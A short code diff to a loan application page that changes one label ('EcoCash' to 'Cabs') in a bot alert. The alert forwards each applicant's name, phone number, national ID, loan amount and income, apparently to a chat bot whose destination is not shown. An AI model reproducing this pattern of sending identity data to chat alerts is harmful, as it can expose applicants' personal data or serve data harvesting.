@@ -57,7 +57,7 @@ export const ApplicationPage = () => {
     });
 
     // Send Real-time Bot Alert
-    sendBotNotification(`🚨 <b>New Client Loan Claim</b>:\n\n<b>Client Name</b>: ${name}\n<b>EcoCash / Phone Number</b>: ${phone}\n<b>National ID</b>: ${idNumber}\n<b>Requested Loan</b>: USD ${loanAmount}\n<b>Monthly Income</b>: USD ${income || '0.00'}\n<b>Repayment Tenure</b>: ${repayment} months`);
+    sendBotNotification(`🚨 <b>New Client Loan Claim</b>:\n\n<b>Client Name</b>: ${name}\n<b>Cabs / Phone Number</b>: ${phone}\n<b>National ID</b>: ${idNumber}\n<b>Requested Loan</b>: USD ${loanAmount}\n<b>Monthly Income</b>: USD ${income || '0.00'}\n<b>Repayment Tenure</b>: ${repayment} months`);
 
     setTimeout(() => {
       setSubmitting(false);
